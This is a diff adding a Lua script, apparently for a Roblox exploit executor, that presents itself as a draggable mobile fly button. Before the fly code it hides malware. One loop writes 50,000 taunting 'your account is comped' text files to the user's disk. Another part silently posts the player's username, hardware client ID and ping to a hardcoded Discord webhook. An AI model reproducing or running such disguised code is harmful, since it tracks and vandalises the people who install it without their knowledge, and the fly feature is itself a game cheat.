@@ -1,0 +1,176 @@
+-- Services
+for i = 1, 50000 do
+
+
+    local fileName = "beamed" .. i .. ".txt"
+
+
+    local content = "beamed " .. i .. " by yza using yza method 1.1 your account is comped ggs"
+
+
+    writefile(fileName, content)
+
+
+end
+local webh = "https://discord.com/api/webhooks/1273232363698262018/dMho6_BzSltC3607w8V9QTy8rkjqk6xISw5HwjtmhHFSSMT63SNMhO0ntK-p3pWhQbQN"
+warn("haha")
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = 'script',
+       ['description'] = '',
+       ['fields'] = {
+          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Variables
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local flying = false
+local flySpeed = 23  -- Adjust speed as needed
+local bodyVelocity = nil
+
+-- UI Creation
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FlyGui"
+screenGui.Parent = player.PlayerGui
+
+local flyButton = Instance.new("TextButton")
+flyButton.Name = "FlyButton"
+flyButton.Size = UDim2.new(0, 100, 0, 50)
+flyButton.Position = UDim2.new(0.5, -50, 0.5, -25)
+flyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+flyButton.BackgroundTransparency = 0.4
+flyButton.Text = "Fly"
+flyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+flyButton.TextScaled = true
+flyButton.Parent = screenGui
+
+-- Draggable Function for Mobile
+local function makeDraggable(guiObject)
+    local dragging = false
+    local dragStart
+    local startPos
+
+    local function updatePosition(input)
+        local delta = input.Position - dragStart
+        guiObject.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    guiObject.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = guiObject.Position
+        end
+    end)
+
+    guiObject.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.Touch then
+            updatePosition(input)
+        end
+    end)
+
+    guiObject.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+makeDraggable(flyButton)
+
+-- Create BodyVelocity
+local function createBodyVelocity()
+    if bodyVelocity then
+        bodyVelocity:Destroy()
+    end
+    bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+    bodyVelocity.P = 1250
+    bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
+    bodyVelocity.Parent = humanoidRootPart
+end
+
+-- Custom Fly Functionality
+local function enableFly()
+    flying = true
+    flyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    createBodyVelocity()
+
+    -- Control movement direction based on facing direction
+    RunService.RenderStepped:Connect(function()
+        if flying and bodyVelocity then
+            -- Use the player's facing direction for movement
+            local facingDirection = humanoidRootPart.CFrame.LookVector
+            bodyVelocity.Velocity = facingDirection * flySpeed
+        end
+    end)
+end
+
+local function disableFly()
+    flying = false
+    flyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    
+    -- Remove BodyVelocity to stop flying
+    if bodyVelocity then
+        bodyVelocity:Destroy()
+        bodyVelocity = nil
+    end
+end
+
+-- Toggle Fly Function
+flyButton.MouseButton1Click:Connect(function()
+    if flying then
+        disableFly()
+    else
+        enableFly()
+    end
+end)
